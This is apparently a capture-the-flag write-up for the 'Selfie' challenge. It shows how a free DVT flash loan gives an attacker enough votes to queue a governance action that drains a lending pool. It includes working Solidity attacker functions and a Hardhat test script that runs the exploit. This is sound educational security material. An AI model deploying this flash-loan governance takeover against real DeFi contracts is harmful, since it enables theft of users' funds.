# Selfie

## Challenge

A new cool lending pool has launched! It's now offering flash loans of DVT tokens.

Wow, and it even includes a really fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

## Solution

We observe that in order to take the funds from the `SelfiePool.sol`, we may use the following function

```solidity
function drainAllFunds(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit FundsDrained(receiver, amount);
}
```

However this function has an onlyGovernance modifier, that is defined as follows

```solidity
modifier onlyGovernance() {
    require(msg.sender == address(governance), "Only governance can execute this action");
    _;
}
```

This means that only the `SimpleGovernance.sol` contract can invoke the function `drainAllFunds`. If we inspect the governance contract, we see that to execute functions in the name of the governance we need to have more than half of the governance tokens at the moment of queueing. If we only had DVT funds for just one instant to queue a malicious transaction... Oh wait, `SelfiePool` is offering no cost DVT flashloans! This is exactly what we need and the attacker contract, that we name [`AttackerSelfie.sol`](./AttackerSelfie.sol), will have three main functions

```solidity
function attack(uint256 _amount) public {
    pool.flashLoan(_amount);
}

function execute(uint256 _amount) public {
    governance.executeAction(actionId);
    token.transfer(msg.sender, _amount);
}

function receiveTokens(address _token, uint256 _amount) public {
    token.snapshot();
    bytes memory data = abi.encodeWithSignature('drainAllFunds(address)', address(this));
    actionId = governance.queueAction(address(pool), data, 0);
    token.transfer(address(pool), _amount);
}
```

We can first start the attack calling the `flashLoan` function from `SelfiePool`. This will call the `receiveTokens` function. At this moment we need to update the balances in order too be able to queue an action in the governance contract, that is why we make a snapshot of the DVT token. We define the data of the malicious transaction to perform and pass it to the `queueAction` function of `SimpleGovernance`. Once the action is queued, we do not need the DVT tokens anymore and we can pay back the flashloan. Since there is delay of 2 days between the queueing and the execution of the action, we create another function `execute` that will execute the queued action and transfer the drained funds back to the attacker account.

In order to implement this attack using ethers, we fill the file [`selfie.challenge.js`](../../test/selfie/selfie.challenge.js) with the following code

```javascript
it("Exploit", async function () {
  /** CODE YOUR EXPLOIT HERE */
  const Attacker = await ethers.getContractFactory("AttackerSelfie", attacker)
  attackerContract = await Attacker.deploy(
    this.token.address,
    this.governance.address,
    this.pool.address
  )
  await attackerContract.attack(TOKENS_IN_POOL)

  await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]) // 2 days

  await attackerContract.execute(TOKENS_IN_POOL)
})
```
